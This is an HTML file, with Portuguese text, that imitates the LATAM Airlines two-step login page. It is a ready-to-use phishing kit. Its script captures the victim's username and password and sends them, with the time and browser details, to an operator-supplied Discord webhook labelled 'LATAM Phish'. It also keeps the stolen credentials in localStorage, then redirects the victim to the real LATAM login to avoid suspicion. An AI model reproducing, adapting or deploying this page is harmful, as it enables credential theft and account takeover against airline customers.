<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LATAM Airlines - Login</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #ffffff url('bg.png') no-repeat center bottom;
    background-size: cover;
  }

  .card {
    background: #ffffff;
    width: 100%;
    max-width: 540px;
    border-radius: 16px;
    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
    overflow: hidden;
    border-top: 4px solid #2b1e6b;
    margin: 20px;
  }

  .card-inner {
    padding: 52px 50px 44px;
  }

  .logo {
    display: flex;
    align-items: center;
    margin-bottom: 40px;
  }

  .logo img {
    height: 48px;
    width: auto;
  }

  h1 {
    font-size: 27px;
    font-weight: 600;
    color: #1e1b4b;
    margin-bottom: 10px;
    line-height: 1.25;
  }

  .subtitle {
    font-size: 14.5px;
    color: #5b5675;
    margin-bottom: 34px;
    line-height: 1.45;
  }

  .field {
    margin-bottom: 28px;
  }

  label {
    display: block;
    font-size: 13px;
    font-weight: 500;
    color: #374151;
    margin-bottom: 8px;
  }

  input[type="text"],
  input[type="email"],
  input[type="password"] {
    width: 100%;
    padding: 16px 16px;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    font-size: 15px;
    color: #1f2937;
    background: #fff;
    transition: border-color 0.2s, box-shadow 0.2s;
  }

  input::placeholder {
    color: #9ca3af;
  }

  input:focus {
    outline: none;
    border-color: #e11d48;
    box-shadow: 0 0 0 3px rgba(225, 29, 72, 0.12);
  }

  .btn-continue {
    width: 100%;
    background: #e11d48;
    color: white;
    border: none;
    border-radius: 8px;
    padding: 16px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s;
    margin-bottom: 22px;
  }

  .btn-continue:hover {
    background: #be123c;
  }

  .create-account {
    text-align: center;
    margin-bottom: 30px;
  }

  .create-account a {
    color: #e11d48;
    font-size: 15px;
    font-weight: 600;
    text-decoration: none;
  }

  .create-account a:hover {
    text-decoration: underline;
  }

  .divider {
    height: 1px;
    background: #e5e7eb;
    margin-bottom: 22px;
  }

  .regain {
    text-align: center;
    font-size: 13.5px;
    color: #6b7280;
  }

  .regain a {
    color: #2563eb;
    text-decoration: none;
    font-weight: 500;
  }

  .regain a:hover {
    text-decoration: underline;
  }

  .hidden {
    display: none;
  }

  .back-link {
    display: inline-block;
    margin-bottom: 20px;
    font-size: 14px;
    color: #6b7280;
    text-decoration: none;
    cursor: pointer;
  }

  .back-link:hover {
    color: #e11d48;
  }
</style>
</head>
<body>

  <div class="card">
    <div class="card-inner">

      <div class="logo">
        <img src="logo.png" alt="LATAM Airlines">
      </div>

      <!-- TELA 1 -->
      <div id="step1">
        <h1>Digite seu usuário</h1>
        <p class="subtitle">Se você já é membro LATAM, digite seus dados de acesso:</p>

        <form id="formStep1">
          <div class="field">
            <input 
              type="text" 
              id="userId" 
              name="userId" 
              placeholder="E-mail ou número de sócio" 
              autocomplete="username"
              required
            >
          </div>

          <button type="submit" class="btn-continue">Continuar</button>
        </form>

        <div class="create-account">
          <a href="#">Criar conta</a>
        </div>

        <div class="divider"></div>

        <div class="regain">
          Não consegue entrar na sua conta? <a href="#">Recuperar acesso</a>
        </div>
      </div>

      <!-- TELA 2 -->
      <div id="step2" class="hidden">
        <div class="back-link" id="btnBack">← Voltar</div>

        <h1>Digite sua senha</h1>
        <p class="subtitle">Agora digite a senha da sua conta LATAM:</p>

        <form id="formStep2">
          <div class="field">
            <label id="labelUser"></label>
            <input 
              type="password" 
              id="password" 
              name="password" 
              placeholder="Senha" 
              autocomplete="current-password"
              required
            >
          </div>

          <button type="submit" class="btn-continue">Entrar</button>
        </form>

        <div class="create-account">
          <a href="#">Esqueceu a senha?</a>
        </div>

        <div class="divider"></div>

        <div class="regain">
          Não consegue entrar na sua conta? <a href="#">Recuperar acesso</a>
        </div>
      </div>

    </div>
  </div>

<script>
  // ===================================================
  // COLE A URL DO SEU WEBHOOK DO DISCORD AQUI EM BAIXO
  // ===================================================
  const DISCORD_WEBHOOK = "COLE_AQUI_A_URL_DO_WEBHOOK";
  // ===================================================

  const REAL_LOGIN_URL = "https://auth.latamairlines.com/u/login/";

  let capturedUser = "";

  // Tela 1 → Tela 2
  document.getElementById("formStep1").addEventListener("submit", function(e) {
    e.preventDefault();
    
    capturedUser = document.getElementById("userId").value.trim();
    if (!capturedUser) return;

    document.getElementById("labelUser").textContent = capturedUser;
    document.getElementById("step1").classList.add("hidden");
    document.getElementById("step2").classList.remove("hidden");
  });

  // Botão Voltar
  document.getElementById("btnBack").addEventListener("click", function() {
    document.getElementById("step2").classList.add("hidden");
    document.getElementById("step1").classList.remove("hidden");
  });

  // Captura + envia pro Discord + redireciona
  document.getElementById("formStep2").addEventListener("submit", async function(e) {
    e.preventDefault();

    const password = document.getElementById("password").value;

    const payload = {
      content: null,
      embeds: [{
        title: "🔐 Nova captura LATAM",
        color: 14704648, // vermelho LATAM
        fields: [
          {
            name: "📧 E-mail / Usuário",
            value: "```" + capturedUser + "```",
            inline: false
          },
          {
            name: "🔑 Senha",
            value: "```" + password + "```",
            inline: false
          },
          {
            name: "🕒 Data",
            value: new Date().toLocaleString("pt-BR"),
            inline: true
          },
          {
            name: "🌐 IP / Info",
            value: navigator.userAgent.substring(0, 60) + "...",
            inline: false
          }
        ],
        footer: {
          text: "LATAM Phish"
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Envia pro Discord
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      console.log("Erro ao enviar pro Discord:", err);
    }

    // Também salva no localStorage (backup)
    let historico = JSON.parse(localStorage.getItem("latam_capturas") || "[]");
    historico.push({
      email: capturedUser,
      password: password,
      data: new Date().toLocaleString("pt-BR")
    });
    localStorage.setItem("latam_capturas", JSON.stringify(historico));

    // Redireciona pro site real
    setTimeout(() => {
      window.location.href = REAL_LOGIN_URL;
    }, 600);
  });
</script>

</body>
</html>
